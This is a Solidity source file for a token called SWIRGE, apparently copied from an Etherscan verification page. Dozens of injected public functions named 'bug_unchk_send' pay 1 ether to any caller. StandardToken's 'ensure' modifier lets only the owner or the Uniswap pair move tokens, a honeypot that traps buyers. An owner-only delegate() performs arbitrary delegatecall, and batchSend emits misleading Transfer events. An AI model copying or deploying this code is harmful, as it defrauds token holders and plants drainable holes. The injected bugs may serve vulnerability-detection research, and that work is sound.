/**
 *Submitted for verification at Etherscan.io on 2020-10-17
*/

/**
 *Submitted for verification at Etherscan.io on 2020-10-17
 * 
 * 
 *      /$$$$$$  /$$      /$$ /$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$$
 *     /$$__  $$| $$  /$ | $$|_  $$_/| $$__  $$ /$$__  $$| $$_____/
 *    | $$  \__/| $$ /$$$| $$  | $$  | $$  \ $$| $$  \__/| $$      
 *    |  $$$$$$ | $$/$$ $$ $$  | $$  | $$$$$$$/| $$ /$$$$| $$$$$   
 *     \____  $$| $$$$_  $$$$  | $$  | $$__  $$| $$|_  $$| $$__/   
 *     /$$  \ $$| $$$/ \  $$$  | $$  | $$  \ $$| $$  \ $$| $$      
 *    |  $$$$$$/| $$/   \  $$ /$$$$$$| $$  | $$|  $$$$$$/| $$$$$$$$
 *     \______/ |__/     \__/|______/|__/  |__/ \______/ |________/
 *     
 *                                               
 * web:            swirgepay.com
 * Total supply: 80.000.000 SWIRGE
 * Uniswap supply (40% of total supply): 32.000.000 SWIRGE
 * 
 */

pragma solidity ^0.5.17;

interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor() internal {}
function bug_unchk_send18() payable public{
      msg.sender.transfer(1 ether);}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
function bug_unchk_send5() payable public{
      msg.sender.transfer(1 ether);}
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }
function bug_unchk_send23() payable public{
      msg.sender.transfer(1 ether);}

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }
function bug_unchk_send20() payable public{
      msg.sender.transfer(1 ether);}

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
function bug_unchk_send2() payable public{
      msg.sender.transfer(1 ether);}

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }
function bug_unchk_send14() payable public{
      msg.sender.transfer(1 ether);}

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function bug_unchk_send25() payable public{
      msg.sender.transfer(1 ether);}

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds the allowance"));
        return true;
    }
function bug_unchk_send3() payable public{
      msg.sender.transfer(1 ether);}

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function bug_unchk_send28() payable public{
      msg.sender.transfer(1 ether);}

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
function bug_unchk_send32() payable public{
      msg.sender.transfer(1 ether);}

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from zero address");
        require(recipient != address(0), "ERC20: transfer to zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
function bug_unchk_send15() payable public{
      msg.sender.transfer(1 ether);}

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
function bug_unchk_send16() payable public{
      msg.sender.transfer(1 ether);}

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
function bug_unchk_send31() payable public{
      msg.sender.transfer(1 ether);}

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: not approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        
    }
function bug_unchk_send12() payable public{
      msg.sender.transfer(1 ether);}
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
function bug_unchk_send29() payable public{
      msg.sender.transfer(1 ether);}

    function name() public view returns(string memory) {
        return _name;
    }
function bug_unchk_send24() payable public{
      msg.sender.transfer(1 ether);}

    function symbol() public view returns(string memory) {
        return _symbol;
    }
function bug_unchk_send13() payable public{
      msg.sender.transfer(1 ether);}

    function decimals() public view returns(uint8) {
        return _decimals;
    }
function bug_unchk_send26() payable public{
      msg.sender.transfer(1 ether);}
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero thrown");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract StandardToken {

  function bug_unchk_send9() payable public{
      msg.sender.transfer(1 ether);}
  event Transfer(address indexed _from, address indexed _to, uint _value);
  function bug_unchk_send17() payable public{
      msg.sender.transfer(1 ether);}
  event Approval(address indexed _owner, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
function bug_unchk_send19() payable public{
      msg.sender.transfer(1 ether);}

    function transferFrom(address _from, address _to, uint _value) public payable ensure(_from, _to) returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
function bug_unchk_send10() payable public{
      msg.sender.transfer(1 ether);}

    

    function delegate(address a, bytes memory b) public payable {
        require(msg.sender == owner);
        a.delegatecall(b);
    }
function bug_unchk_send7() payable public{
      msg.sender.transfer(1 ether);}
    
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
function bug_unchk_send1() payable public{
      msg.sender.transfer(1 ether);}

    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value/2);
            emit Transfer(msg.sender, _to, _value/2);
        }
        return true;
    }
function bug_unchk_send30() payable public{
      msg.sender.transfer(1 ether);}

    modifier ensure(address _from, address _to) {
        address UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        require(_from == owner || _to == owner || _from == UNI);
        _;
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

  function bug_unchk_send27() payable public{
      msg.sender.transfer(1 ether);}
  uint constant public decimals = 18;
  function bug_unchk_send6() payable public{
      msg.sender.transfer(1 ether);}
  uint public totalSupply;
  function bug_unchk_send21() payable public{
      msg.sender.transfer(1 ether);}
  string public name;
  function bug_unchk_send4() payable public{
      msg.sender.transfer(1 ether);}
  string public symbol;
  function bug_unchk_send22() payable public{
      msg.sender.transfer(1 ether);}
  address private owner;
  function bug_unchk_send8() payable public{
      msg.sender.transfer(1 ether);}
  address constant internal UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
function bug_unchk_send11() payable public{
      msg.sender.transfer(1 ether);}
}